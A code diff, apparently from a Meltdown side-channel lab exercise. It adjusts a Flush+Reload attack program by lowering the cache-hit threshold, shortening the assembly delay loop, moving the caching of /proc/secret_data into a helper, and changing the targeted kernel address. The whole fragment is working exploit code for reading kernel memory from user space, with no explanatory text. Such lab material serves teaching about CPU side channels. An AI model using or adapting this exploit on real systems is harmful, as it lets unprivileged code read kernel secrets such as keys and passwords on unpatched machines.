@@ -11,7 +11,7 @@
 /*********************** Flush + Reload ************************/
 uint8_t array[256*4096];
 /* cache hit time threshold assumed*/
-#define CACHE_HIT_THRESHOLD (330)
+#define CACHE_HIT_THRESHOLD (160)
 #define DELTA 1024
 
 void flushSideChannel()
@@ -59,7 +59,7 @@ void meltdown_asm(unsigned long kernel_data_addr)
    
    // Give eax register something to do
    asm volatile(
-       ".rept 800;"                
+       ".rept 400;"                
        "add $0x141, %%eax;"
        ".endr;"                    
     
@@ -99,16 +99,11 @@ int main()
   // FLUSH the probing array
   flushSideChannel();
   
-  // Open the /proc/secret_data virtual file.
-	int fd = open("/proc/secret_data", O_RDONLY);
-	if (fd < 0) {
-		perror("open");
-		return -1;
-	}
-	int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
+  if(cache_kernel_data() == -1)
+    return -1;
     
   if (sigsetjmp(jbuf, 1) == 0) {
-     meltdown_asm(0xb06b2842);
+     meltdown_asm(0x9ca6ad8a);
   }
   else {
       printf("Memory access violation!\n");
